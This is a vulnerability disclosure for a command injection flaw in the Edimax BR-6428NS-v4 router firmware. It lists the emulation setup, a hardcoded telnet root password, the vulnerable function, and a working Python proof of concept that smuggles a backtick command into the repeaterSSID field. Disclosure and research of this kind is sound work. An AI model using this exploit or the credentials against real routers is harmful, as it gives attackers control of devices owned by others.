# Command Injection

Execute commands directly on the router via HTTP POST requests.

## Device Information

**Device**: Edimax Wireless Router BR-6428NS-v4

**Firmware Version**: BR-6428NS_v4_1.10

**Firmware Download Link**: https://www.edimax.com/edimax/download/download/data/edimax/global/download/wireless_routers_n300/br-6428ns_v4

![image-20241012150947135](./images/image-20241012150947135.png)

**Emulation Environment**: ubuntu-18.04.6-desktop-amd64 + [FirmAE](https://github.com/pr0v3rbs/FirmAE) + python-3.6.9

**Emulation Command**:

```shell
sudo ./run.sh -r Edimax ~/Desktop/BR-6428NS_v4_1.10.zip
```

![image-20241012151406971](./images/image-20241012151406971.png)

**Router Homepage**:

![image-20241012153525694](./images/image-20241012153525694.png)

**Telnet**:

Username and password: root/edimaxens

![image-20241012153704459](./images/image-20241012153704459.png)

**Vulnerability Location**: In the squashfs-root system of the firmware package, specifically within the /bin/webs ELF file’s wlgetHiddenSSIDinfo function, which is triggered by the formWlbasic function.

## Cause of the Vulnerability

The wlgetHiddenSSIDinfo function accepts parameters that are unvalidated and controlled by HTTP Post requests, allowing system commands to be directly executed using backticks **`**.

![image-20241012170043109](./images/image-20241012170043109.png)

The function is then called by the formWlbasic function.

Command injection logic is entered with chan=19.

![image-20241012170317086](./images/image-20241012170317086.png)

## PoC

```python
import requests

command = "touch /var/test1"

url = "http://192.168.2.1/goform/formWlbasic"
data = {
    "chan":19,
    "repeaterSSID":f"`{command}`"
}

r = requests.post(url, data=data)
#print(r.text)
```

**Execution Result**:

![image-20241012171224564](./images/image-20241012171224564.png)